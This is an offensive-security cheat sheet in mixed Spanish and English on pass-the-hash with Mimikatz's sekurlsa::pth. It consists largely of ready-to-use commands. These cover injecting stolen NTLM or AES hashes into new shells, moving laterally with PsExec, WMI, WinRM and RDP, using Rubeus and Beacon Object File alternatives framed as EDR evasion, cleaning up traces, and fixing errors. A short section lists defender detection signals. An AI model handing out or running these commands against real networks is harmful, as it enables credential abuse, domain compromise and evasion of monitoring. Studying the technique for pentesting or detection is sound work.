---
aliases:
  - mimikatz pth
  - sekurlsa pth
  - PtH Injection
  - Process Token Injection
tags:
  - technique/lateral-movement
  - technique/credential-access
  - asset/active-directory
  - cred/ntlm
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Pass-the-Hash]]"
---
# Pass-the-Hash - Mimikatz Injection

***

## sekurlsa::pth Basic

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `mimikatz # privilege::debug` | Habilita SeDebugPrivilege | Pre-pth. |
| `mimikatz # sekurlsa::pth /user:admin /domain:corp.local /ntlm:<NT> /run:cmd.exe` | Spawn cmd con NTLM creds inyectadas | Standard. |
| `mimikatz # sekurlsa::pth /user:admin /domain:corp.local /ntlm:<NT> /run:powershell.exe` | PS shell con creds | PS workflow. |
| `mimikatz # sekurlsa::pth /user:admin /domain:corp.local /aes256:<key> /run:cmd.exe` | AES256 inject | OPSEC (AES less detectable que RC4). |
| `mimikatz # sekurlsa::pth /user:admin /domain:corp.local /ntlm:<NT> /aes256:<key> /run:cmd.exe` | Combo NTLM + AES | Comprehensive. |
^pth-mimi-basic

**Cómo funciona:** Mimikatz inyecta hash en estructura LSASS del proceso nuevo. Proceso usa hash inyectado para todas las auth NTLM/Kerberos outbound. Tools nativas Windows funcionan transparentemente.

```cmd
:: Standard workflow
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:aabbcc1122334455... /run:cmd.exe

:: Nuevo cmd abre con creds inyectadas
:: En el nuevo cmd:
dir \\dc01\C$
psexec.exe \\dc01 cmd.exe
```

___

## Post-Injection Tools

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `dir \\<target>\C$` | Test SMB access (con creds inyectadas) | Validation. |
| `net use \\<target>\C$` | Mount share | Standard. |
| `PsExec.exe \\<target> cmd.exe` (Sysinternals) | RCE nativo | Standard. |
| `wmic /node:<target> process call create "cmd.exe"` | WMI native | Alt. |
| `Enter-PSSession -ComputerName <target>` | WinRM nativo | PS native. |
| `mstsc /restrictedAdmin /v:<target>` | RDP RestrictedAdmin con creds inject | Needs target enable. |
| `klist` | Verify Kerberos tickets (post-Overpass) | Confirm Kerberos auth. |
^pth-mimi-tools

___

## Comparison: PtH Inject vs Impacket

| **Aspecto** | **mimikatz `sekurlsa::pth`** | **Impacket (psexec/wmiexec/etc)** |
|:---:|:---:|:---:|
| Source machine | **Windows requiere** | Linux / Windows. |
| Requires LSASS access | Sí (priv local admin) | No. |
| Memory injection | Sí | No. |
| Native tools post-inject | Yes (transparent) | No (single tool exec). |
| Detection | LSASS access events | NTLM events on target. |
| Use case | Workstation pivot | Linux attacker box. |
^pth-mimi-comparison

**Cuándo usar mimikatz inject:** ya estás en Windows host comprometido + querés usar tools nativas (`net use`, `PsExec`, `mstsc /restrictedAdmin`).

**Cuándo usar Impacket:** desde Linux box atacante, single command exec.

___

## Process Tree / Detection

| **Detalle** | **Significa** | **Defender side** |
|:---:|:---:|:---:|
| `cmd.exe` spawned from `mimikatz.exe` | Process lineage anómalo | EDR alert. |
| LSASS read access (process_access events) | sekurlsa accesses LSASS memory | Sysmon Event 10. |
| Token bind con SID anómalo | Inject footprint | Token analysis. |
| New TGT request from unusual source IP | Post-overpass behavior | KDC anomaly. |
^pth-mimi-detection

**Detection signals defender:**
- Sysmon Event 10 (`OpenProcess` con `0x1010` o `0x1410` access masks → LSASS read).
- Sysmon Event 1 (process create) — `cmd.exe` con parent `mimikatz.exe`.
- Event 4624 (logon) en target con auth package NTLM desde host inesperado.

___

## Stealth: Process Lineage Mask

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `Invoke-Pasta` / `Invoke-PsExec` con custom payload | Embedded mimikatz BOF | Cobalt Strike / similar. |
| `Rubeus.exe pth /user:... /ntlm:... /createnetonly:cmd.exe` | Rubeus alternativa (sin Mimikatz binary) | Modern alt. |
| BOF (`Beacon Object File`) PtH | In-process injection (sin binary) | EDR-evasion. |
| `runas /netonly /user:... cmd` post-injection | Spawn child process | Tree separation. |
^pth-mimi-stealth

```cmd
:: Rubeus alt (sin Mimikatz binary)
Rubeus.exe pth /user:Administrator /domain:corp.local /ntlm:aabbcc... /createnetonly:cmd.exe
```

___

## Cleanup Post-Injection

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `klist purge` (en injected shell) | Limpia Kerberos cache | Post-engagement. |
| Close injected cmd/PowerShell window | Termina proceso | Cleanup. |
| `Restart-Computer` (en host) | Last resort cleanup | Aggressive. |
^pth-mimi-cleanup

**Caveat:** mimikatz inject es **per-process**. Cerrar el cmd/PS = creds inject mueren. Sin persistence sin re-inject.

___

## Common Errors

| **Error** | **Causa** | **Fix** |
|:---:|:---:|:---:|
| `ERROR mimikatz_doLocal ; "pth" command of "sekurlsa" module not found` | Sin priv (no SeDebugPrivilege) | `privilege::debug` first. |
| `Privilege '20' not held` | No local admin | Need elevated context. |
| `Authentication ID is null` | LSASS handle failed | Run as admin / try `procdump` first. |
| Inyected cmd "Access Denied" en target | Hash incorrecto / user revoked | Re-dump hash. |
| `KDC_ERR_PREAUTH_FAILED` post-inject | Hash format wrong | Verify NT hash format (32 hex). |
^pth-mimi-errors

***
